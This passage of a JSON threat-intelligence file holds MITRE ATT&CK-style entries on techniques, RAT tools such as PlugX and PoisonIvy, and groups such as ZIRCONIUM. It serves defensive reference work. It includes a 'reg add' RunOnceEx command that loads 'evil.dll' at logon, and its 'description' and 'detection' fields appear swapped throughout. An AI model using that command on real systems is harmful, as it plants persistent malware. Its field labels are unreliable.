                "detection": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "DLL Side-Loading",
                "chain_phase": "persistence",
                "description": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
                "detection": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Checks",
                "chain_phase": "defense-evasion",
                "description": "Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",
                "detection": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Masquerade Task or Service",
                "chain_phase": "defense-evasion",
                "description": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1547.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Registry Run Keys / Startup Folder",
                "chain_phase": "persistence",
                "description": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1094",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Custom Command and Control Protocol",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "T1083",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "File and Directory Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.  Custom tools may also be used to gather file and directory information and interact with the Native API.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0013",
            "type": "tool",
            "attributes": {
                "name": "PlugX",
                "aliases": [
                    "DestroyRAT",
                    "Sogu",
                    "Kaba",
                    "Korplug"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PlugX is a remote access tool (RAT) that uses modular plugins. It has been used by multiple threat groups.    ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 25,
            "techniques": [
                "T1012",
                "T1026",
                "T1140",
                "T1547.001",
                "T1083",
                "T1113",
                "T1112",
                "T1497.001",
                "T1056.001",
                "T1036.004",
                "T1574.002",
                "T1135",
                "T1095",
                "T1071.004",
                "T1543.003",
                "T1106",
                "T1071.001",
                "T1057",
                "T1043",
                "T1105",
                "T1094",
                "T1049",
                "T1102.001",
                "T1127.001",
                "T1059.003"
            ]
        },
        {
            "id": "T1547.014",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Active Setup",
                "chain_phase": "persistence",
                "description": "Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",
                "detection": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1074.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Local Data Staging",
                "chain_phase": "collection",
                "description": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1065",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Uncommonly Used Port",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "T1014",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Rootkit",
                "chain_phase": "defense-evasion",
                "description": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)",
                "detection": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.  ",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1010",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Application Window Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0012",
            "type": "tool",
            "attributes": {
                "name": "PoisonIvy",
                "aliases": [
                    "Poison Ivy",
                    "Darkmoon"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PoisonIvy is a popular remote access tool (RAT) that has been used by many groups.   ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 15,
            "techniques": [
                "T1010",
                "T1065",
                "T1014",
                "T1112",
                "T1543.003",
                "T1027",
                "T1005",
                "T1074.001",
                "T1056.001",
                "T1547.014",
                "T1105",
                "T1059.003",
                "T1547.001",
                "T1055.001",
                "T1573.001"
            ]
        },
        {
            "id": "G0128",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "ZIRCONIUM",
                "aliases": [
                    "APT31"
                ],
                "description": "ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.",
                "tools": [],
                "techniques": [
                    "T1598",
                    "T1583.006",
                    "T1583.001",
                    "T1573.001",
                    "T1102.002",
                    "T1204.001",
                    "T1567.002",
                    "T1059.006",
                    "T1059.003",
                    "T1566.002",
                    "T1555.003",
                    "T1036.004",
                    "T1027.002",
                    "T1218.007",
                    "T1547.001",
                    "T1140",
                    "T1124",
                    "T1105",
                    "T1082",
                    "T1068",
                    "T1041",
                    "T1036",
                    "T1033",
                    "T1016",
                    "T1012"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "G0127",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "TA551",
                "aliases": [
                    "GOLD CABIN",
                    "Shathak"
                ],
                "description": "TA551 is a financially-motivated threat group that has been active since at least 2018.  The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. ",
                "tools": [
                    "S0483",
                    "S0386",
                    "S0476"
                ],
                "techniques": [
                    "T1589.002",
                    "T1071.001",
                    "T1132.001",
                    "T1204.002",
                    "T1568.002",
                    "T1059.003",
                    "T1566.001",
                    "T1027.003",
                    "T1218.010",
                    "T1218.005",
                    "T1218.011",
                    "T1105",
                    "T1036",
                    "T1027"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1204.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Malicious File",
                "chain_phase": "execution",
                "description": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
                "detection": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.\n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Spearphishing Attachment",
                "chain_phase": "initial-access",
                "description": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1027.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Steganography",
                "chain_phase": "defense-evasion",
                "description": "Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings are other signatures left in system artifacts related to decoding steganography.",
                "detection": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.  ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1027.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Software Packing",
                "chain_phase": "defense-evasion",
                "description": "Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.",
                "detection": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.007",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Msiexec",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.",
                "detection": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Asynchronous Procedure Call",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1053.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Scheduled Task",
                "chain_phase": "execution",
                "description": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
                "detection": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1082",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Information Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
                "detection": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1069",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Permission Groups Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
